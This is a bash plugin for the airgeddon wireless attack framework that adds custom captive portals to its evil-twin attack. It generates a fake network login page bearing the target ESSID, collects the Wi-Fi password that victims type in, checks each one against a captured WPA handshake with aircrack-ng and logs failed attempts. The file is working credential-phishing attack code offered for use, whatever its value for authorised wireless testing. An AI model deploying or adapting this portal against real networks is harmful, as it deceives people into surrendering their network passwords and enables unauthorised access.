#!/usr/bin/env bash

# Custom-Portals airgeddon plugin

# Version:    0.0.1
# Author:     KeyofBlueS
# Repository: https://github.com/KeyofBlueS/airgeddon-plugins
# License:    GNU General Public License v3.0, https://opensource.org/licenses/GPL-3.0

# airgeddon Repository: https://github.com/v1s1t0r1sh3r3/airgeddon

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Custom-Portals"
plugin_description="Use Your own captive portals"
plugin_author="KeyofBlueS"

plugin_enabled=1

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")


# Put Your custom captive portal files in plugins/custom_portals/PORTAL_FOLDER/PORTAL_FILES
# You can have multiple PORTAL_FOLDER, then choose one of them inside airgeddon itself

custom_portals_dir="custom_portals/"

#Copy custom captive portal files.
function custom_portals_override_set_captive_portal_page() {

	debug_print

	if [[ "${copy_custom_portal}" -eq "1" ]]; then
		cp "${scriptfolder}${plugins_dir}${custom_portals_dir}${custom_portal}/"* "${tmpdir}${webdir}"
		unset copy_custom_portal
	fi

	if [[ ! -f "${tmpdir}${webdir}${cssfile}" ]]; then
		{
		echo -e "body * {"
		echo -e "\tbox-sizing: border-box;"
		echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
		echo -e "}\n"
		echo -e ".button {"
		echo -e "\tcolor: #ffffff;"
		echo -e "\tbackground-color: #1b5e20;"
		echo -e "\tborder-radius: 5px;"
		echo -e "\tcursor: pointer;"
		echo -e "\theight: 30px;"
		echo -e "}\n"
		echo -e ".content {"
		echo -e "\twidth: 100%;"
		echo -e "\tbackground-color: #43a047;"
		echo -e "\tpadding: 20px;"
		echo -e "\tmargin: 15px auto 0;"
		echo -e "\tborder-radius: 15px;"
		echo -e "\tcolor: #ffffff;"
		echo -e "}\n"
		echo -e ".title {"
		echo -e "\ttext-align: center;"
		echo -e "\tmargin-bottom: 15px;"
		echo -e "}\n"
		echo -e "#password {"
		echo -e "\twidth: 100%;"
		echo -e "\tmargin-bottom: 5px;"
		echo -e "\tborder-radius: 5px;"
		echo -e "\theight: 30px;"
		echo -e "}\n"
		echo -e "#password:hover,"
		echo -e "#password:focus {"
		echo -e "\tbox-shadow: 0 0 10px #69f0ae;"
		echo -e "}\n"
		echo -e ".bold {"
		echo -e "\tfont-weight: bold;"
		echo -e "}\n"
		echo -e "#showpass {"
		echo -e "\tvertical-align: top;"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${cssfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${jsfile}" ]]; then
		{
		echo -e "(function() {\n"
		echo -e "\tvar onLoad = function() {"
		echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
		echo -e "\t\tif (formElement != null) {"
		echo -e "\t\t\tvar password = document.getElementById(\"password\");"
		echo -e "\t\t\tvar showpass = function() {"
		echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
		echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
		echo -e "\t\t\tvar validatepass = function() {"
		echo -e "\t\t\t\tif (password.value.length < 8) {"
		echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t\telse {"
		echo -e "\t\t\t\t\tformElement.submit();"
		echo -e "\t\t\t\t}"
		echo -e "\t\t\t}"
		echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
		echo -e "\t\t}"
		echo -e "\t};\n"
		echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
		echo -e "})();\n"
		echo -e "function redirect() {"
		echo -e "\tdocument.location = \"${indexfile}\";"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${jsfile}"
	fi

	if [[ ! -f "${tmpdir}${webdir}${indexfile}" ]]; then
		{
		echo -e "#!/usr/bin/env bash"
		echo -e "echo '<!DOCTYPE html>'"
		echo -e "echo '<html>'"
		echo -e "echo -e '\t<head>'"
		echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
		echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
		echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
		echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
		echo -e "echo -e '\t</head>'"
		echo -e "echo -e '\t<body>'"
		echo -e "echo -e '\t\t<div class=\"content\">'"
		echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
		echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
		echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
		echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
		echo -e "echo -e '\t\t\t\t</div>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
		echo -e "echo -e '\t\t\t\t<label>'"
		echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
		echo -e "echo -e '\t\t\t\t</label>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
		echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
		echo -e "echo -e '\t\t\t</form>'"
		echo -e "echo -e '\t\t</div>'"
		echo -e "echo -e '\t</body>'"
		echo -e "echo '</html>'"
		echo -e "exit 0"
		} >> "${tmpdir}${webdir}${indexfile}"
	#elif echo "${tmpdir}${webdir}${indexfile}" | grep -q "ESSID_HERE"; then
		#sed "s/ESSID_HERE/${essid//[\`\']/}/" < "${tmpdir}${webdir}${indexfile}" > "${tmpdir}${webdir}${indexfile}".tmp
		#mv "${tmpdir}${webdir}${indexfile}".tmp "${tmpdir}${webdir}${indexfile}"
	fi

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/usr/bin/env bash
		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'
	EOF

	cat >&4 <<-'EOF'
		POST_DATA=$(cat /dev/stdin)
		if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
			POST_DATA=${POST_DATA#*=}
			password=${POST_DATA/+/ }
			password=${password//[*&\/?<>]}
			password=$(printf '%b' "${password//%/\\x}")
			password=${password//[*&\/?<>]}
		fi

		if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
	EOF

	cat >&4 <<-EOF
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
	EOF

	cat >&4 <<-'EOF'
			echo "${password}" >\
	EOF

	cat >&4 <<-EOF
			"${tmpdir}${webdir}${currentpassfile}"
			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
	EOF

	cat >&4 <<-'EOF'
			if [ "$?" = "0" ]; then
	EOF

	cat >&4 <<-EOF
				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
	EOF

	cat >&4 <<-'EOF'
				echo "${password}" >>\
	EOF

	cat >&4 <<-EOF
				"${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
	EOF

	cat >&4 <<-'EOF'
		elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
	EOF

	cat >&4 <<-EOF
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi
		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'
	EOF

	cat >&4 <<-'EOF'
		if [ ${et_successful} -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}

#Custom captive portal selection menu
function custom_portals_prehook_set_captive_portal_language() {

	debug_print

	clear
	language_strings "${language}" 293 "title"
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	echo
	language_strings "${language}" 318 "green"
	print_simple_separator
	language_strings "${language}" 266
	print_simple_separator

	ls -d1 -- "${scriptfolder}${plugins_dir}${custom_portals_dir}"*/ | rev | awk -F'/' '{print $2}' | rev | sort > "${tmpdir}ag.custom_portals.txt"
	local i=0
	while IFS=, read -r exp_folder; do

		i=$((i + 1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		portal=${exp_folder}
		echo -e "${sp1}${i}) ${portal}"
	done < "${tmpdir}ag.custom_portals.txt"

	unset selected_custom_portal
	echo
	if [[ ! -s "${tmpdir}ag.custom_portals.txt" ]]; then
		echo_yellow "No custom captive portals found! We will use the standard one."
		echo_brown "Please put Your custom captive portal files in:"
		echo_brown "${scriptfolder}${plugins_dir}${custom_portals_dir}PORTAL_FOLDER/PORTAL_FILES"
		language_strings "${language}" 115 "read"
	else
		read -rp "> " selected_custom_portal
		if [[ ! "${selected_custom_portal}" =~ ^[[:digit:]]+$ ]] || [[ "${selected_custom_portal}" -gt "${i}" ]]; then
			invalid_captive_portal_language_selected
		fi
		
		if [[ "${selected_custom_portal}" -eq 0 ]]; then
			return_to_et_main_menu=1
			return 1
		else
			custom_portal="$(sed -n "${selected_custom_portal}"p "${tmpdir}ag.custom_portals.txt")"
			rm "${tmpdir}custom_portals.txt"
			copy_custom_portal=1
			echo_green "${custom_portal}"
		fi
	fi
}
